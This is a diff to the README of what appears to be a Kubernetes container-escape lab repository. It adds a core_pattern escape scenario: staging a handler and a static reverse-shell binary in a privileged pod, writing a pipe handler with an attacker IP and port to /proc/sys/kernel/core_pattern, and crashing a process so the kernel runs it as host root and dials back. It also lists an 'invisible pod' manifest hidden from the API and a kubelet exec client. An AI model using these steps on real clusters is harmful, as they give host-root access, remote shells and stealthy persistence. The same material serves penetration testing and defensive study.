@@ -14,12 +14,19 @@ container-escape/
 ├── find-privileged-pods.sh   # discover attackable pods (privileged/hostPID/hostNetwork)
 ├── SCENARIO.md               # end-to-end scenario lab on the real cluster
 ├── README.md
-└── 01-privileged-workload-scenario/   # verified escape: any privileged DaemonSet → host rootfs
-    ├── README.md                  # the single how-to guide (steps 0–6)
-    ├── helpers/                   # static mount helper + Makefile (prebuilt included)
-    │   ├── Makefile  mnt.c  mnt
-    └── manifests/
-        └── node-telemetry.yaml     # invisible-pod manifest (drop into kubelet dir)
+├── 01-privileged-workload-scenario/   # verified escape: any privileged DaemonSet → host rootfs
+│   ├── README.md                  # the single how-to guide (steps 0–6)
+│   ├── helpers/                   # static mount helper + Makefile (prebuilt included)
+│   │   ├── Makefile  mnt.c  mnt
+│   ├── manifests/
+│   │   └── node-telemetry.yaml     # invisible-pod manifest (drop into kubelet dir)
+│   └── kubelet-exec.py             # kubelet /exec websocket client (cert or SA token)
+└── 02-core-pattern-scenario/         # verified escape: core_pattern pipe handler → host-root shell
+    ├── README.md                  # the single how-to guide (steps 0–7)
+    ├── handlers/
+    │   └── handler.sh             # core_pattern pipe handler (drains dump, dials back)
+    └── helpers/                   # static reverse-shell helper + Makefile (prebuilt included)
+        ├── Makefile  revsh.c  revsh
 ```
 
 Each real workload scenario gets its own `NN-NNN-scenario/` directory. The
@@ -51,7 +58,7 @@ the realistic targets (calico-node, kube-proxy, CNI/log agents). On this lab
 cluster, calico-node and kube-proxy show up privileged+hostNetwork, and the
 control-plane components hostNetwork-only (good control group).
 
-## Verified scenario
+## Verified scenarios
 
 ### 01-privileged-workload-scenario — privileged DaemonSet → host rootfs → invisible pod
 
@@ -70,6 +77,22 @@ Falco/Sysdig/Fluent Bit, custom telemetry agents):
    — kubelet runs it, the API never mirrors it.
 4. **Kubelet API exec** (optional) — authenticate to `:10250` with the admin
    client cert and exec a shell into the invisible pod (`nsenter -t 1 -a`).
+
+### 02-core-pattern-scenario — core_pattern pipe handler → host-root shell
+
+Follow `02-core-pattern-scenario/README.md`. Different primitive: instead of
+mounting the host disk, the escape **makes the kernel execute code** through
+the core-dump pipe handler. Also verified against calico-node, and this one
+needs **only `privileged: true`** — no hostPID, no hostPath:
+
+1. Stage the handler + a static reverse-shell binary (`revsh`) in the pod —
+   they land on the host-visible overlay upperdir.
+2. `echo '|/host/path/handler IP PORT' > /proc/sys/kernel/core_pattern` —
+   a global, non-namespaced sysctl the privileged pod can write.
+3. Crash any process (`ulimit -c unlimited; kill -s SEGV $$`) — the kernel
+   runs the handler as **host root in the init namespaces**.
+4. The handler drains the dump and dials back to your listener with the
+   static `revsh` helper (the `nc`/`/dev/tcp` replacement for modern images).
 
 ## Precursor knowledge (see chat notes)
 
@@ -91,7 +114,7 @@ Falco/Sysdig/Fluent Bit, custom telemetry agents):
 
 | Technique                 | Prereq in pod          | Host-side default that gates it                    |
 |---------------------------|------------------------|---------------------------------------------------|
-| core_pattern              | privileged + host access to host `/proc/sys` | any (usermodehelper runs in init ns) |
+| core_pattern              | `privileged: true` only — pod `/proc/sys` is rw, and the sysctl is non-namespaced | handler must be host-visible + executable (overlay upperdir, no `noexec`) |
 | ptrace injection          | `hostPID: true` + `CAP_SYS_PTRACE` | `kernel.yama.ptrace_scope` |
 | cgroup release_agent (v1) | privileged, root       | cgroup **v1** (`/sys/fs/cgroup/cpu,cpuacct`)        |
 | namespace pivot (nsenter/pivot_root) | privileged (+hostPID) | any; needs util-linux in pod        |
